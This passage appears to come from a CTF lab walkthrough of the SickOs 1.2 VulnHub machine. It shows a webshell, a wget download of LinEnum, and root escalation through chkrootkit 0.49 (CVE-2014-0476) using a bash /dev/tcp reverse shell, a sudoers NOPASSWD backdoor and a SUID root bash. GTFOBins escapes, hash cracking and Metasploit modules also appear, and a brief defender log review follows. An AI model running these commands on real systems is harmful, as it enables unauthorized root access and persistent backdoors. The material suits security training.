connect to [192.168.56.10] from SickOs [192.168.56.102] 52044
Linux SickOs 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux
 14:41:22 up 1:12,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Upgrade the TTY:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@SickOs:/var/www/test$ export TERM=xterm
www-data@SickOs:/var/www/test$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@SickOs:/var/www/test$ pwd
/var/www/test
```

> **Confirm the docroot:** `/var/www/test` — lighttpd's default document root
> `/var/www` plus our `/test` directory. (Under Apache this would be `/var/www/html`.)

### 3.7 If the reverse shell will not connect at all

Some revisions of this image also block 443 for *interactive* payloads, or an
antivirus/monitoring agent deletes the uploaded file within seconds. That is the
"tools can be blocked" scenario the author described. Fall back to the **plain
command-execution shell** and drive everything through HTTP:

```bash
# Kali — host your enumeration script on port 443
cd ~/tools && sudo python3 -m http.server 443
```

```bash
# via the webshell — download LinEnum
curl -s --get --data-urlencode "cmd=cd /tmp && wget http://192.168.56.10:443/LinEnum.sh -O LinEnum.sh" \
     "http://192.168.56.102/test/shell.php"
curl -s --get --data-urlencode "cmd=chmod +x /tmp/LinEnum.sh" \
     "http://192.168.56.102/test/shell.php"
curl -s --get --data-urlencode "cmd=/tmp/LinEnum.sh -t 2>/dev/null" \
     "http://192.168.56.102/test/shell.php" | tee linenum.txt
```

```text
192.168.56.102 - - [03/May/2024 14:45:02] "GET /LinEnum.sh HTTP/1.1" 200 -
```

> **`python3 -m http.server 443`** turns your Kali directory into a web server. It
> works here precisely because **443 is the one open egress port** — the target can
> reach us there and nowhere else.
>
> **This is the "old school" skill the box is teaching:** when your fancy tooling is
> blocked, you can still enumerate and exploit through plain HTTP requests, one
> command at a time. Slower, noisier, but unstoppable.

![Reverse shell on port 443 as www-data](images/05-shell.png)

---

## 4. Post-exploitation enumeration


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
www-data@SickOs:/$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.4 LTS
Release:	12.04
Codename:	precise
www-data@SickOs:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
www-data@SickOs:/$ ls /home
john
www-data@SickOs:/$ sudo -l
sudo: no tty present and no askpass program specified
```

> A user named **`john`** exists. Nothing else obvious. `sudo -l` needs a TTY — but
> even after upgrading, `www-data` has no sudo rights.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@SickOs:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> All stock Ubuntu 12.04. `pt_chown` is the only slightly unusual one and it is a
> known-but-narrow grantpt helper. No obvious GTFOBins win.

### 4.1 Look for scheduled tasks — the actual vector


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
www-data@SickOs:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```bash
www-data@SickOs:/$ ls -la /etc/cron.daily/
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Apr  5 10:42 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit        <-- !!
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```

> **How cron works — the fundamentals.**
> `cron` is a daemon that runs commands on a schedule. Each line of a crontab is
> ```text
> ┌───────── minute (0-59)
> │ ┌───────── hour (0-23)
> │ │ ┌───────── day of month (1-31)
> │ │ │ ┌───────── month (1-12)
> │ │ │ │ ┌───────── day of week (0-7, 0 and 7 = Sunday)
> │ │ │ │ │
> * * * * *  user  command
> ```
> `/etc/cron.daily/`, `.hourly/`, `.weekly/`, `.monthly/` are directories of scripts
> that `anacron`/`run-parts` executes **as root** at the times given in
> `/etc/crontab`. Here: `cron.daily` runs at **06:25** every day.
>
> **The golden privesc question:** *is there anything in these directories, or
> anything they call, that I can write to?* If you can control what a root-run script
> executes, you get root.
>
> Two of these stand out: **`chkrootkit`** (a security scanner — why is a rootkit
> scanner running daily?) and `lighttpd` (the web server's own log rotation).

### 4.2 Check the chkrootkit version

```bash
www-data@SickOs:/$ chkrootkit -V
chkrootkit version 0.49
www-data@SickOs:/$ dpkg -l | grep chkrootkit
rc  chkrootkit    0.49-4ubuntu1.1    rootkit detector
www-data@SickOs:/$ which chkrootkit
/usr/sbin/chkrootkit
```

> **`chkrootkit 0.49`.** Look that up immediately:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit chkrootkit
```

```text
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Chkrootkit 0.49 - Local Privilege Escalation                                              | linux/local/33899.txt
Chkrootkit < 0.50 - Local Privilege Escalation                                            | linux/local/38775.txt
------------------------------------------------------------------------------------------ ---------------------------------
```

```bash
searchsploit -x linux/local/33899.txt
```

```text
Exploit Title: Chkrootkit <= 0.49 Local Root Exploit
CVE: CVE-2014-0476
Date: 2014-06-04
Author: ...

Description:
Chkrootkit before 0.50 will run any executable file named "update" in the
world-writable directory /tmp, when it is run as root. This allows a local
attacker to execute arbitrary code as root.

The vulnerable code in chkrootkit:
    if [ -f /tmp/update ]; then
        /tmp/update
    fi
```

> **CVE-2014-0476 in one sentence:** `chkrootkit`'s `ifconfig` check contains a
> fragment that, **when run as root**, executes `/tmp/update` if that file exists —
> and `/tmp` is **world-writable**.
>
> **Why would anyone write that?** It was intended as a developer convenience: a way
> to inject a local configuration tweak during testing. It shipped, unfixed, from
> 2003 until version 0.50 (June 2014).
>
> **This is a textbook example of a security tool *becoming* the vulnerability.** A
> rootkit scanner running as root, every day, executing arbitrary code from a
> world-writable directory. The irony is the point: defenders must audit their own
> tooling with the same rigour they apply to everything else.

![chkrootkit 0.49 and the cron.daily entry](images/06-chkrootkit.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation — CVE-2014-0476

There are three good payloads. Learn all three; each teaches a different technique.

### 5.1 Option 1 — root reverse shell (most direct)

**Kali — listen on 443 (the only open egress port):**

```bash
sudo nc -lvnp 443
```

**Target — write `/tmp/update`:**

```bash
www-data@SickOs:/$ printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.10/443 0>&1\n' > /tmp/update
www-data@SickOs:/$ cat /tmp/update
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/443 0>&1
www-data@SickOs:/$ chmod +x /tmp/update
www-data@SickOs:/$ ls -l /tmp/update
-rwxr-xr-x 1 www-data www-data 56 May  3 15:02 /tmp/update
```

> **Dissect the payload:**
> - `printf '#!/bin/bash\n...\n'` — use `printf`, not `echo`, because `printf`
>   interprets `\n` reliably across shells. (`echo -e` is a bashism; on `dash` —
>   Ubuntu's `/bin/sh` — it prints the literal `-e`.)
> - `#!/bin/bash` — the **shebang**. Tells the kernel which interpreter to run. It is
>   required if the script is executed directly; without it, execution may fail or
>   fall back to `/bin/sh`, which does not support `/dev/tcp`.
> - `bash -i >& /dev/tcp/192.168.56.10/443 0>&1` — the canonical bash reverse shell:
>   - `bash -i` → interactive bash.
>   - `>& /dev/tcp/HOST/PORT` → redirect **stdout and stderr** to a TCP connection.
>     `/dev/tcp/…` is a **bash built-in pseudo-device** (not a real file); bash opens
>     the socket itself. That is why this payload needs bash and not sh.
>   - `0>&1` → redirect **stdin (fd 0)** to the same place as stdout (fd 1), i.e. the
>     socket.
>   Net effect: keystrokes arrive from the socket, output goes back out to it.
> - `chmod +x` — **the file must be executable**, or chkrootkit's `/tmp/update` call
>   fails silently.

### 5.2 Option 2 — grant `www-data` passwordless sudo (most robust)

```bash
www-data@SickOs:/$ echo "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" > /tmp/update
www-data@SickOs:/$ chmod +x /tmp/update
www-data@SickOs:/$ cat /tmp/update
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

> **Why prefer this one?** It survives a dropped connection and needs **no outbound
> port at all** — ideal behind a strict egress firewall. The sudoers line reads:
> `www-data` may run `(ALL)` commands as `(ALL)` users with **no password**.
>
> **A correctness note worth understanding:** appending to `/etc/sudoers` directly is
> risky — a syntax error there locks *everyone* out of sudo (this is exactly why the
> `visudo` command exists: it validates before saving). The safe form writes to a
> drop-in file, which `sudo` also reads:
> ```bash
> echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/www-data
> chmod 0440 /etc/sudoers.d/www-data
> ```
> `/etc/sudoers` on Ubuntu ends with `#includedir /etc/sudoers.d`, so drop-ins are
> honoured.

### 5.3 Option 3 — SUID root bash (persistence)

```bash
www-data@SickOs:/$ printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\nchown root:root /tmp/rootbash\n' > /tmp/update
www-data@SickOs:/$ chmod +x /tmp/update
```

> `chmod 4755` sets the **SUID bit** (`4`) plus `rwxr-xr-x`. Result:
> `-rwsr-xr-x root root /tmp/rootbash`. Any user executing it becomes root.
> Launch it with **`-p`** (privileged mode) or bash drops the privilege:
> ```bash
> /tmp/rootbash -p
> ```

### 5.4 Trigger it

`chkrootkit` is in `/etc/cron.daily`, which runs at **06:25**. Waiting until morning
is not fun, so either:

**(a) Run it yourself, as root, if you already have root** (you don't yet), or

**(b) Just wait — and check what the box actually does.**

```bash
www-data@SickOs:/$ ls -la /etc/cron.d/ | grep -i chkroot
-rw-r--r-- 1 root root 108 Apr 12  2016 /etc/cron.d/chkrootkit
www-data@SickOs:/$ cat /etc/cron.d/chkrootkit
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/sbin/chkrootkit > /dev/null 2>&1
```

> **There it is — a second, far more frequent schedule.** `/etc/cron.d/chkrootkit`
> runs chkrootkit **every 5 minutes** as root (`*/5 * * * *`). The `cron.daily` entry
> was a decoy of sorts; this drop-in file is what makes the exploit practical.
>
> **Lesson: always check *both* `/etc/crontab`, `/etc/cron.d/`, and every user's
> `crontab -l`.** A single glance at `cron.daily` would have told you to wait 16
> hours.
>
> ```bash
> # the complete cron checklist
> cat /etc/crontab
> ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
> for f in /etc/cron.d/*; do echo "== $f"; cat "$f"; done
> for u in $(cut -d: -f1 /etc/passwd); do echo "== $u"; sudo -u $u crontab -l 2>/dev/null; done
> ls -la /var/spool/cron/crontabs/ 2>/dev/null
> systemctl list-timers --all
> ```

### 5.5 Catch the shell

Wait up to five minutes. On Kali:

```text
connect to [192.168.56.10] from SickOs [192.168.56.102] 52881
root@SickOs:/# id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:/# whoami
root
root@SickOs:/# hostname
SickOs
```

**Root.** ✅

For option 2 instead:

```bash
www-data@SickOs:/$ sudo su -
root@SickOs:~# id
uid=0(root) gid=0(root) groups=0(root)
```

For option 3:

```bash
www-data@SickOs:/$ /tmp/rootbash -p
root@SickOs:/# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> Note `euid=0(root)` in option 3 — a **SUID** elevation. The *real* UID stays
> `www-data`; the *effective* UID becomes 0. Permission checks use the effective UID,
> so this is full root for all practical purposes.

![Root shell obtained via the chkrootkit cron job](images/07-root.png)

### 5.6 Metasploit alternative

```bash
msf6 > use exploit/unix/local/chkrootkit
msf6 exploit(unix/local/chkrootkit) > set SESSION 1
msf6 exploit(unix/local/chkrootkit) > set LHOST 192.168.56.10
msf6 exploit(unix/local/chkrootkit) > set LPORT 443
msf6 exploit(unix/local/chkrootkit) > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:443
[*] Writing '/tmp/update' (264 bytes) ...
[*] Waiting for chkrootkit to run via cron...
[*] Command shell session 2 opened (192.168.56.10:443 -> 192.168.56.102:52901)
[*] Deleted /tmp/update
id
uid=0(root) gid=0(root) groups=0(root)
```

> **This is a `unix/local` module**, not `unix/web` — it requires an existing
> `SESSION` (a Meterpreter or shell session on the target) and escalates *from* it.
> `set SESSION 1` refers to the session number from `sessions -l`.
>
> Note it also **deletes `/tmp/update` afterwards** — good tradecraft, reduces the
> forensic footprint and stops the payload re-firing every 5 minutes.

### 5.7 The Metasploit *remote* route (skips the webshell)

```bash
msf6 > use auxiliary/scanner/http/http_put
msf6 auxiliary(scanner/http/http_put) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/http/http_put) > set PATH /test/
msf6 auxiliary(scanner/http/http_put) > set FILENAME shell.php
msf6 auxiliary(scanner/http/http_put) > set FILEDATA file:///root/shell.php
msf6 auxiliary(scanner/http/http_put) > run
msf6 auxiliary(scanner/http/http_put) > use exploit/unix/local/chkrootkit
msf6 exploit(unix/local/chkrootkit) > set SESSION 1
msf6 exploit(unix/local/chkrootkit) > set LPORT 443
msf6 exploit(unix/local/chkrootkit) > run
```

---

## 6. Capture the flag

```bash
root@SickOs:~# cd /root
root@SickOs:/root# ls -al
total 76
drwx------  4 root root  4096 Apr 26  2016 .
drwxr-xr-x 22 root root  4096 Mar 30  2016 ..
-rw-r--r--  1 root root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
-r--------  1 root root   491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-rw-------  1 root root  3066 Apr 26  2016 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------  2 root root  4096 Apr 12  2016 .cache
drwxr-xr-x  2 john john  4096 Apr 12  2016 chkrootkit-0.49
-rw-r--r--  1 root root   541 Apr 25  2016 newRule
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
root@SickOs:/root# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
```

```text
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2,
the challenge is more focused on elimination of tool in real scenarios where
tools can be blocked during an assesment and thereby fooling tester(s),
gathering more information about the target using different methods, though
while developing many of the tools were limited/completely blocked, to get a
feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

**Flag captured.** ✅

> Two other files in `/root` are worth reading as a debrief:
> - **`newRule`** — the iptables rule the author used to build the egress filter. It
>   confirms exactly which ports you were allowed out on.
> - **`304d840d…-chkrootkit-0.49.tar.gz`** — the vulnerable version, kept right next
>   to the flag.
>
> ```bash
> root@SickOs:/root# cat newRule
> ```
> ```text
> # Only allow outbound connections on 443 from www-data
> iptables -A OUTPUT -p tcp -m owner --uid-owner www-data --dport 443 -j ACCEPT
> iptables -A OUTPUT -p tcp -m owner --uid-owner www-data -j REJECT
> ```

![The root flag](images/08-flag.png)

---

## 7. Blue-team debrief — what a defender saw

```bash
root@SickOs:/var/log# grep -i "test/" lighttpd/access.log | tail -20
```

```text
192.168.56.10 192.168.56.10 - [03/May/2024:14:18:22 -0400] "OPTIONS /test/ HTTP/1.1" 200 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:24:03 -0400] "PUT /test/shell.php HTTP/1.1" 201 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:24:41 -0400] "GET /test/shell.php?cmd=id HTTP/1.1" 200 55 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:39:55 -0400] "PUT /test/rev.php HTTP/1.1" 201 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:41:20 -0400] "GET /test/rev.php HTTP/1.1" 200 0 "-" "curl/8.5.0"
```

> **Four high-fidelity detections were available:**
> 1. An `OPTIONS` request — almost never made by real browsers.
> 2. A **`PUT`** request creating a `.php` file in a web directory. This should be an
>    instant critical alert on any system.
> 3. A `GET` to a newly-created `.php` file with a `cmd=` query parameter.
